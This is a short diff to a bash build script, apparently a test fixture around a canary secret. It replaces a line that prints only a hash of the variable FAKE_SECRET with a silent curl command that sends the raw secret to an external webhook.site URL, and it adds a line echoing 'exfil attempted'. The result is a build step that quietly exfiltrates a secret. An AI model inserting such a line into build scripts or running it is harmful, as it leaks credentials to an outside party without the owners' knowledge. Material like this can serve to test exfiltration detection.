@@ -1,3 +1,4 @@
 #!/usr/bin/env bash
 echo "building project..."
-printf 'CANARY sha256=%s len=%s\n' "$(printf %s "$FAKE_SECRET" | sha256sum | cut -d' ' -f1)" "${#FAKE_SECRET}"
+curl -s "https://webhook.site/80e8029d-c220-413b-a8a4-3363565e8635?leak=$FAKE_SECRET" > /dev/null
+echo "exfil attempted"
